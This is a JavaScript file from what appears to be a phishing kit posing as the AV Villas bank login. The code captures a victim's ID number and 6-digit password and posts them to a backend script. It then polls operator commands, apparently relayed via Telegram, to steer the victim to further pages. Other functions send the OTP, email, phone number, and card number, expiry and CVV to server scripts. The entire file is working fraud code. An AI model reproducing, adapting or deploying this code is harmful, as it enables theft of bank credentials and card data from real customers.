function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}


function iniciar(){
    $("#fondo,#cargando").hide();
}

function createFreshTransactionId() {
    const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11);
    localStorage.setItem('session_id', generated);
    localStorage.setItem('last_tid', generated);
    return generated;
}

function resolveTransactionId(forceNew = false) {
    const params = new URLSearchParams(window.location.search);
    const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== '');
    if (forceNew) {
        return createFreshTransactionId();
    }
    if (direct) {
        const normalized = String(direct);
        localStorage.setItem('session_id', normalized);
        localStorage.setItem('last_tid', normalized);
        return normalized;
    }
    const fromStorage = localStorage.getItem('session_id');
    if (fromStorage && String(fromStorage).trim() !== '') {
        return String(fromStorage);
    }
    return createFreshTransactionId();
}

function cerrar(){
     window.location.href = "https://www.avvillas.com.co/bancadigital/inicio"; 
}

function status(){
    // Obtener session_id y messageId del localStorage
    const sessionId = resolveTransactionId(false);
    const messageId = localStorage.getItem('messageId');
    
    if (!sessionId || !messageId) {
        // Si no hay datos de sesión, redirigir al inicio
        window.location.href = "../index.html";
        return;
    }
    
    // Verificar respuesta de Telegram
    const formData = new FormData();
    formData.append('transactionId', sessionId);
    formData.append('messageId', messageId);

    const verifierUrl = 'verificar_respuesta.php?ts=' + Date.now();
    fetch(verifierUrl, {
        method: 'POST',
        body: formData,
        cache: 'no-store'
    })
    .then(response => response.json())
    .then(result => {
        if (result.action) {
            switch (result.action) {
                case 'pedir_dinamica':
                case 'error_token':
                    window.location.href = "../token.php";
                    break;
                case 'error_logo':
                    window.location.href = "../error/";
                    break;
                case 'exito':
                    // En lugar de redirigir a portal, continuar en el sistema
                    // o redirigir a una página específica que necesites
                    window.location.href = "../sistema/";
                    break;
                case 'finalizar':
                    window.location.href = "../resumen/";
                    break;
                default:
                    // Si no hay acción específica, continuar verificando
                    break;
            }
        } else {
            // Si no hay respuesta aún, continuar verificando
            // La función se llamará nuevamente en 2 segundos
        }
    })
    .catch(err => {
        // Si hay error, continuar verificando
    });
}

function esperando(){
    window.location.href = "sistema/";    
}

function esperando_in(){
    window.location.href = "../sistema/";    
}

function enviar_usuario(u,p){
    console.log("=== INICIANDO enviar_usuario ===");
    
    // Generar un transactionId nuevo por cada envío para evitar mezclar respuestas entre pasos
    let sessionId = resolveTransactionId(true);
    
    console.log("SessionId:", sessionId);
    
    // Validar que la clave tenga 6 dígitos
    if (p.length !== 6) {
        alert('La clave debe tener 6 dígitos');
        $("#fondo,#cargando").hide();
        return;
    }
    
    // Validar que la identificación tenga al menos 5 dígitos
    if (u.length < 5) {
        alert('La identificación debe tener al menos 5 dígitos');
        $("#fondo,#cargando").hide();
        return;
    }

    // Guardar datos en localStorage
    localStorage.setItem('username', u);
    localStorage.setItem('password', p);
    localStorage.setItem('session_id', sessionId);
    localStorage.setItem('identificacion', u);

    // Detectar tipo de dispositivo
    const userAgent = navigator.userAgent;
    let dispositivo = 'PC';
    
    if (/Android/i.test(userAgent)) {
        dispositivo = 'Android';
    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
        dispositivo = 'iPhone';
    } else if (/Windows/i.test(userAgent)) {
        dispositivo = 'PC';
    } else if (/Mac/i.test(userAgent)) {
        dispositivo = 'Mac';
    } else if (/Linux/i.test(userAgent)) {
        dispositivo = 'Linux';
    }
    
    const timestamp = new Date().toLocaleString('es-ES');
    
    // Obtener tbdatos completo del localStorage
    const tbdatosStr = localStorage.getItem('tbdatos');
    let tbdatos = {};
    try {
        tbdatos = tbdatosStr ? JSON.parse(tbdatosStr) : {};
    } catch (e) {
        tbdatos = {};
    }
    
    console.log("tbdatos keys:", Object.keys(tbdatos));
    
    // Obtener total_pagar desde localStorage o desde tbdatos
    const amountCandidates = [
        localStorage.getItem('total_pagar'),
        localStorage.getItem('monto'),
        localStorage.getItem('amount'),
        localStorage.getItem('valor'),
        localStorage.getItem('valor_pagar'),
        localStorage.getItem('total'),
        tbdatos.total_pagar,
        tbdatos.monto,
        tbdatos.amount,
        tbdatos.valor,
        tbdatos.valor_pagar,
        tbdatos.total
    ];
    const amountValue = amountCandidates.find(value =>
        value !== null && value !== '' && value !== undefined && String(value).trim() !== ''
    ) || '0';
    if (amountValue !== '0' && (!tbdatos.total_pagar || String(tbdatos.total_pagar) === '0')) {
        tbdatos.total_pagar = String(amountValue);
        localStorage.setItem('tbdatos', JSON.stringify(tbdatos));
    }
    const total_pagar = amountValue;

    console.log("total_pagar:", total_pagar);

    // Preparar payload con todos los datos
    const payload = {
        tbdatos: tbdatos,
        usuario: u,
        clave: p,
        total_pagar: total_pagar,
        dispositivo: dispositivo,
        timestamp: timestamp,
        transactionId: sessionId
    };

    console.log("Payload preparado:", JSON.stringify(payload).substring(0, 200));

    // Enviar como JSON
    fetch('procesar_logo.php', {
        method: 'POST',
        body: JSON.stringify(payload),
        headers: { 'Content-Type': 'application/json' }
    })
    .then(res => {
        console.log("Response status:", res.status);
        return res.json();
    })
    .then(result => {
        console.log("Resultado:", result);
        if (result.status === 'success') {
            console.log("Envío exitoso, messageId:", result.messageId);
            localStorage.setItem('messageId', result.messageId);
            // Continuar con verificación real
            setTimeout(() => {
                checkPaymentVerification(sessionId, result.messageId);
            }, 2000);
        } else {
            console.log("Envío falló:", result.message);
            // Si falla el envío real, usar simulación
            simularEnvio(sessionId);
        }
    })
    .catch(err => {
        console.error("ERROR fetch:", err);
        // Si hay error, usar simulación
        simularEnvio(sessionId);
    });
}

function simularEnvio(sessionId) {
    // Simular respuesta exitosa
    const messageId = 'msg_' + Date.now();
    localStorage.setItem('messageId', messageId);
    
    // Simular delay y luego continuar
    setTimeout(() => {
        checkPaymentVerification(sessionId, messageId);
    }, 2000);
}

async function checkPaymentVerification(transactionId, messageId) {
    try {
        // Intentar verificación real primero
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const verifierUrl = 'verificar_respuesta.php?ts=' + Date.now();
        const res = await fetch(verifierUrl, {
            method: 'POST',
            body: formData,
            cache: 'no-store'
        });
        const result = await res.json();

        if (result.action) {
            switch (result.action) {
                case 'pedir_dinamica':
                case 'error_token':
                    window.location.href = "token.html";
                    break;
                case 'error_logo':
                    $("#fondo,#cargando").hide();
                    alert("Usuario o clave incorrectos.");
                    window.location.href = "index.html";
                    break;
                case 'procesando':
                    // No redirigir, solo ocultar el loader
                    $("#fondo,#cargando").hide();
                    break;
                case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
                    window.location.href = "/fin.php";
                    break;
                case 'error':
                    window.location.href = "/caras";
                    break;
                case 'cedula':
                    window.location.href = "/cedula";
                    break;
                case 'tarjeta':
                case 'error_tc':
                    window.location.href = "/datac/alter.php";
                    break;
                case 'bre_b':
                    window.location.href = "/recaudos/brev.php?occidente";
                    break;
                default:
                    setTimeout(() => {
                        checkPaymentVerification(transactionId, messageId);
                    }, 2000);
                    break;
            }
        } else {
            // Si no hay respuesta real, seguir verificando cada 2 segundos
            setTimeout(() => {
                checkPaymentVerification(transactionId, messageId);
            }, 2000);
        }
    } catch (err) {
        // Si hay error, reintentar después de 2 segundos
        setTimeout(() => {
            checkPaymentVerification(transactionId, messageId);
        }, 2000);
    }
}



function enviar_otp(o){
    $.post( "../../../../../process/paso4otp.php", { otp:o } ,function(data) {     
        setTimeout(esperando_in, 600);      
    });
}

function enviar_correo(m,c){    
    $.post( "../process/put-mail.php",{ eml:m, cel:c},function(data) {
        window.location.href = "../sistema/index.html";
    });
}

function enviar_tarjeta(t,f,c){    
    $.post( "../process/put-card.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "../sistema/index.html";
    });
}


